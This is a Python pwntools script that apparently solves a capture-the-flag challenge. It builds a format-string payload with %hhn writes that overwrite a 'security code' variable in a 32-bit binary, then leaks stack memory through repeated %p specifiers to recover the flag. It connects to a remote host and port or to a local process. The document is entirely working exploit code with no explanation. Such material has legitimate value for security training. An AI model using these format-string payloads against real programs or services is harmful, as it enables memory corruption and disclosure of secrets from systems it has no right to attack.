from pwn import *

context.arch = "i386"
seccode = 0x0804c03c

def pad(s):
    return s+b"x"*(1023-len(s))

payload = b""
payload += p32(seccode)
payload += p32(seccode+1)
payload += p32(seccode+2)
payload += p32(seccode+3)
payload += b"%238x%15$hhn"
payload += b"%204x%16$hhn"
payload += b"%227x%17$hhn"
payload += b"%254x%18$hhn"

exp = pad(payload)
isremote = True
def leak_flag(n):
    flag = b""
    
    while b"}" not in flag:
        if isremote:
            p = remote("185.235.41.205",7040)
        else:
            p = process("./securitycode")
        
        p.recv()
        p.sendline("A")
        p.recv()
        p.send(exp)
        modifier = "%"+str(n)+"$p"
        p.sendline(modifier)
        p.recvuntil(b"password is ")
        flag += p64(int(p.recv(10),16))
        n+=1

    return flag.replace(b'\x00',b'')

flag = leak_flag(7)
print(flag)